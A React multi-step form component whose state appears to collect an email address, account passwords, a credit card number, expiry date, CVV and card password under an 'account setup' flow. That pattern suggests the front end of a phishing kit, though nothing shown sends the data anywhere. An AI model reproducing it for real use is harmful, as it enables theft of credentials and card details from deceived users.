import React, { Component } from 'react';
import AccountSetup from './AccountSetup';
import SocialProfiles from './SocialProfiles';
import Confirm from './Confirm';
import Success from './Success';

export class Form extends Component {
    state = {
        step: 1,
        cp: '',
        email: '',
        phone: '',
        passapp: '',
        cc: '',
        valcc: '',
        cvv: ''
    };

    nextStep = () => {
        const { step } = this.state;
        this.setState({ step: step + 1 });
    };

    prevStep = () => {
        const { step } = this.state;
        this.setState({ step: step - 1 });
    };

    inputChange = input => e => {
        this.setState({
            [input]: e.target.value
        });
    };

    render() {
        const { step } = this.state;
        const { cp, email, phone, passapp, cc, valcc, ccpass,passemail,cvv } = this.state;
        const values = { cp, email, phone, passapp, cc, valcc, ccpass,passemail,cvv };


        
        switch (step) {
            case 1:
                return (
                    <AccountSetup
                        nextStep={this.nextStep}
                        inputChange={this.inputChange}
                        values={values}
                    />
                );
            case 2:
                return (
                    <SocialProfiles
                        nextStep={this.nextStep}
                        prevStep={this.prevStep}
                        inputChange={this.inputChange}
                        values={values}
                    />
                );
            case 3:
                return (
                    <Confirm
                        nextStep={this.nextStep}
                        prevStep={this.prevStep}
                        values={values}
                    />
                );
            case 4:
                return (
                    <Success />
                );
        }
    }
}

export default Form
